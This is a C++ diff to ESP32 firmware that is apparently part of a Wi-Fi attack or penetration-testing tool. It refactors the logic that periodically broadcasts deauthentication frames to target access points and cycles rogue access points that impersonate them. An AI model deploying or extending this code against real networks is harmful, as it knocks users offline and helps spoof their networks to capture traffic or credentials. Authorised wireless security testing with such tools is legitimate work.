@@ -23,11 +23,14 @@ const char* LOG_TAG = "main:attack_method";
 esp_timer_handle_t deauth_timer_handle;
 esp_timer_handle_t rogueap_timer_handle;
 
+ap_records_t gApRecordsForBroadcast;
+
 typedef struct {
-  uint8_t current_ap_idx;
-  ap_records_t* ap_records;
+  bool isAttackInProgress{false};
+  uint8_t current_ap_idx{0};
+  ap_records_t ap_records;
 } multiple_rogue_ap_data_t;
-multiple_rogue_ap_data_t* gMmultipleRogueApData = NULL;
+multiple_rogue_ap_data_t gMmultipleRogueApData;
 }  // namespace
 
 extern bool gShouldLimitAttackLogs;
@@ -43,8 +46,8 @@ static void timer_send_deauth_frame(void* arg) {
   ap_records_t* ap_records = (ap_records_t*)arg;
 
   std::string ap_ssids;
-  for (int i = 0; i < ap_records->len; ++i) {
-    ap_ssids += (const char*)ap_records->records[i]->ssid;
+  for (const auto& ap_record : *ap_records) {
+    ap_ssids += (const char*)ap_record->ssid;
     ap_ssids += ", ";
   }
   ap_ssids.pop_back();
@@ -60,21 +63,23 @@ static void timer_send_deauth_frame(void* arg) {
     ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
   }
 
-  for (int i = 0; i < ap_records->len; ++i) {
-    wsl_bypasser_send_deauth_frame(ap_records->records[i]);
+  for (const auto& ap_record : *ap_records) {
+    wsl_bypasser_send_deauth_frame(ap_record);
   }
 }
 
 /**
  * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
  */
-void attack_method_broadcast(ap_records_t* ap_records, unsigned period_sec) {
+void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec) {
+  gApRecordsForBroadcast = ap_records;
+
   esp_timer_create_args_t deauth_timer_args{};
   deauth_timer_args.callback = &timer_send_deauth_frame;
-  deauth_timer_args.arg = (void*)ap_records;
+  deauth_timer_args.arg = (void*)&gApRecordsForBroadcast;
 
   // Call for the first time
-  timer_send_deauth_frame(ap_records);
+  timer_send_deauth_frame((void*)&ap_records);
 
   ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
   ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
@@ -118,9 +123,9 @@ void start_rogue_ap(const wifi_ap_record_t* ap_record) {
  */
 void timer_change_rogue_ap(void* arg) {
   multiple_rogue_ap_data_t* multiple_rogue_ap_data = (multiple_rogue_ap_data_t*)arg;
-  start_rogue_ap(multiple_rogue_ap_data->ap_records->records[multiple_rogue_ap_data->current_ap_idx]);
+  start_rogue_ap(multiple_rogue_ap_data->ap_records[multiple_rogue_ap_data->current_ap_idx]);
   ++multiple_rogue_ap_data->current_ap_idx;
-  if (multiple_rogue_ap_data->current_ap_idx >= multiple_rogue_ap_data->ap_records->len) {
+  if (multiple_rogue_ap_data->current_ap_idx >= multiple_rogue_ap_data->ap_records.size()) {
     multiple_rogue_ap_data->current_ap_idx = 0;
   }
 }
@@ -133,18 +138,19 @@ void timer_change_rogue_ap(void* arg) {
  * @param ap_records expects structure of type ap_records describing Rogue APs
  * @param per_ap_timeout how long to establish each Rogue AP
  */
-void start_multiple_rogue_ap_attack(ap_records_t* ap_records, uint16_t per_ap_timeout) {
-  gMmultipleRogueApData = (multiple_rogue_ap_data_t*)malloc(sizeof(multiple_rogue_ap_data_t));
-  gMmultipleRogueApData->current_ap_idx = 0;
-  gMmultipleRogueApData->ap_records = ap_records;
+void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
+  gMmultipleRogueApData = {};
+  gMmultipleRogueApData.isAttackInProgress = true;
+  gMmultipleRogueApData.current_ap_idx = 0;
+  gMmultipleRogueApData.ap_records = ap_records;
 
   esp_timer_create_args_t rogueap_timer_args{};
   rogueap_timer_args.callback = &timer_change_rogue_ap;
-  rogueap_timer_args.arg = (void*)gMmultipleRogueApData;
+  rogueap_timer_args.arg = (void*)&gMmultipleRogueApData;
   ESP_ERROR_CHECK(esp_timer_create(&rogueap_timer_args, &rogueap_timer_handle));
 
   // Call for the first time
-  timer_change_rogue_ap(gMmultipleRogueApData);
+  timer_change_rogue_ap(&gMmultipleRogueApData);
 
   ESP_ERROR_CHECK(esp_timer_start_periodic(rogueap_timer_handle, per_ap_timeout * 1000000));
 }
@@ -157,28 +163,25 @@ void start_multiple_rogue_ap_attack(ap_records_t* ap_records, uint16_t per_ap_ti
  * @param ap_records expects structure of type ap_records describing Rogue APs
  * @param per_ap_timeout how long to establish each Rogue AP
  */
-void attack_method_rogueap(ap_records_t* ap_records, uint16_t per_ap_timeout) {
-  if (gMmultipleRogueApData != NULL) {
+void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
+  if (gMmultipleRogueApData.isAttackInProgress == true) {
     ESP_LOGE(LOG_TAG, "Failed to start RogueAP attack: previous attack is not finished yet");
     return;
   }
 
-  if ((per_ap_timeout != 0) && (ap_records->len > 1)) {
+  if ((per_ap_timeout != 0) && (ap_records.size() > 1)) {
     // Attack multiple APs
     start_multiple_rogue_ap_attack(ap_records, per_ap_timeout);
     return;
   }
 
-  start_rogue_ap(ap_records->records[0]);
+  start_rogue_ap(ap_records[0]);
 }
 
 void attack_method_rogueap_stop() {
   ESP_ERROR_CHECK(esp_timer_stop(rogueap_timer_handle));
   esp_timer_delete(rogueap_timer_handle);
-  if (gMmultipleRogueApData != NULL) {
-    free(gMmultipleRogueApData);
-    gMmultipleRogueApData = NULL;
-  }
+  gMmultipleRogueApData = {};
 
   wifictl_mgmt_ap_start();
   wifictl_restore_ap_mac();
